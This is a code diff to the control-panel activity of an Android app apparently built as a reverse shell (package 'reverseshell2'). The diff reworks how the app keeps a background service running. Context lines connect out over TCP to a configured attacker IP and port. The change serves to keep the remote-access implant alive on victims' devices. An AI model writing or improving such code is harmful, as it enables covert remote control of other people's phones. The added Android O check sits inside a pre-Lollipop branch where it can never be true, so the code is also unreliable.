@@ -1,6 +1,7 @@
 package com.example.reverseshell2;
 
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.content.ContextCompat;
 
 import android.app.Activity;
 import android.content.Intent;
@@ -19,9 +20,13 @@ public class controlPanel extends AppCompatActivity {
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             new functions(activity).jobScheduler(getApplicationContext());
-        }else{
-            activity.startService(new Intent(getApplicationContext(),mainService.class));
-
+        } else {
+            Intent serviceIntent = new Intent(getApplicationContext(), mainService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
+            } else {
+                activity.startService(serviceIntent);
+            }
         }
 
         findViewById(R.id.uninstall).setOnClickListener(new View.OnClickListener() {
@@ -42,9 +47,13 @@ public class controlPanel extends AppCompatActivity {
                 new tcpConnection(activity,getApplicationContext()).execute(config.IP,config.port);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                     new functions(activity).jobScheduler(getApplicationContext());
-                }else{
-                    activity.startService(new Intent(getApplicationContext(),mainService.class));
-
+                } else {
+                    Intent serviceIntent = new Intent(getApplicationContext(), mainService.class);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
+                    } else {
+                        activity.startService(serviceIntent);
+                    }
                 }
             }
         });
